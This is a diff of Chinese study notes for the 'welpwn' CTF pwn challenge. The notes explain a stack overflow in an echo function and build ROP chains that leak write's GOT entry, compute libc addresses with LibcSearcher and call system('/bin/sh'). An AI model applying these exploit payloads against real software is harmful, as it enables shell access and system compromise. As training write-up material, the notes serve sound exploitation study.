@@ -1,3 +1,5 @@
+0.Linux x64汇编函数的调用约定：函数调用时，前六个参数是从左至右依次存放于RDI、RSI、RDX、RCX、R8、R9寄存器里面，剩下的参数从左至右顺序入栈
+  Windows x64会变函数的调用约定：函数调用时，前四个参数是从左至右依次存放于RCX、RDX、R8、R9寄存器里面，剩下的参数从左至右顺序入栈
 1、打开IDA，发现main()函数没有问题，找到echo函数。
 但发现echo(buf)函数，其中buf的大小为0x400，在该函数中存在赋值语句：
  for ( i = 0; *(_BYTE *)(i + a1); ++i )
@@ -5,7 +7,12 @@
 赋值的终止条件是当读取到a1中\x00的时候。其中s2的大小为0x10。
 存在溢出。输入payload的时候，就会在覆盖eip地址后截断(地址一般都有\x00)。
 
-Welpwn题解首先用IDA查看发现主函数不能栈溢出，我们看看echo这个函数，echo会把主函数输入的字符串复制到局部的s2里，并且s2只有16字节，可以造成溢出。
+
+如果本题目的判断条件不是 for ( i = 0; *(_BYTE *)(i + a1); ++i )，其中a1（buf）不能为00的地址，否则后面的就执行不了啦。
+那么payload应该为 payload = 'a'*0x18 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)n
+
+Welpwn题解(本题解根据writeup第二条分析而来)
+首先用IDA查看发现主函数不能栈溢出，我们看看echo这个函数，echo会把主函数输入的字符串复制到局部的s2里，并且s2只有16字节，可以造成溢出。
 Echo函数先循环复制字符到s2，如果遇到0，就结束复制，然后输出s2。
 因此，我们如果想直接覆盖函数返回地址，那么我们的目标函数必须没有参数，否则，我们用p64(...)包装地址时，必然会出现0。
 比如我们的payload为payload = 'a'*0x18+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)由于是64为包装，因此payload字符串为’a’*0x18 + ‘\xa3\x08\x40\x00\x00\x00\x00\x00’+ ‘......’
@@ -66,26 +73,45 @@ buf+24处应该存某一地址，且该地址处有四个pop指令，和一个re
 在接下来的地址处，我们就可以写其他函数。
 
 在0x40089C处正好有四个pop和一个retn
+0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 
-假如我们的payload = 'a'*0x18 + p64(pop_24) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)
+假如我们的payload = 'a'*0x18 + p64(pop_32) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)
 那么栈布局如下
 
 那么栈布局如下
 aaaaaaaa
 aaaaaaaa	0x10字节数据区
 aaaaaaaa	echo函数栈的ebp
-pop_24_addr	echo函数返回地址
-aaaaaaaa
-aaaaaaaa
-aaaaaaaa
-pop_24_addr
-pop_rdi
-write_got
-puts_plt
+pop_32_addr(rop)echo函数返回地址		-----------------
+aaaaaaaa	pop r12					| 等
+aaaaaaaa	pop r13	   				| 价
+aaaaaaaa	pop r14					| 于
+pop_32_addr	pop r15 ; ret				|<==>
+pop_rdi	   《----------------------------------------------
+write_got	//rdi=write_got
+puts_plt	//put(write_got)
 main_addr	0x400字节数据区
 main函数栈的ebp
 
 那么，echo函数执行完以后，跳到pop_24地址处，由于跳转后，栈顶指针指向buf，出栈4个后，指针指向buf+32 ，
 接下来遇到retn，出栈一个元素为(pop_rdi)作为pop_24的返回地址，这样跳转到了pop_rdi，后面类似。
 我们调用system 获取到shell
+
+
+使用libcSearcher：
+24.sh.recvuntil('\x40')
+25.#泄露write地址
+26.write_addr=u64(sh.recv(6).ljust(8,'\x00'))
+27.
+28.libc=LibcSearcher('write',write_addr)
+29.#获取libc加载地址
+30.libc_base=write_addr-libc.dump('write')
+31.#获取system地址
+32.system_addr=libc_base+libc.dump('system')
+33.#获取/bin/sh地址
+34.binsh_addr=libc_base+libc.dump('str_bin_sh')
+
+
+
+
 
